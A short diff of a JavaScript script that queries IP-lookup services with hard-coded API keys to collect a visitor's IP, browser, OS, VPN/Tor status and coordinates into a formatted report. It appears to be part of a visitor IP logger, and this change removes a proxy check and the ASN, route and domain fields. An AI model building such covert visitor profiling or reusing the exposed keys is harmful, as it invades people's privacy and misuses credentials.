@@ -130,12 +130,6 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
   let namebrowser = engine.name;
   let osnam = data.os.name;
   let osvers = data.os.version;
-
-
-fetch('https://api.ip2location.io/?key=845094BBD7FCAE829B7D6AF3AE13FC02&format=json')
-.then(response => response.json())
-.then(data => {
-  let proxy = data.is_proxy;
     
         const message = `
       * Ip 🌐*
@@ -149,9 +143,6 @@ fetch('https://api.ip2location.io/?key=845094BBD7FCAE829B7D6AF3AE13FC02&format=j
     *├ Vpn: ${isVPN}*
     *├ Tor: ${isTOR}*
     *├ Coordinates: ${longitude} ${latitude},*
-    *├ Asn: ${isAsn}*
-    *├ Route: ${isRoute}*
-    *├ Domain: ${isDomain}*
     *├ TLD: ${tld}*
     *├ Version: ${versian}*
       * System 🖥*
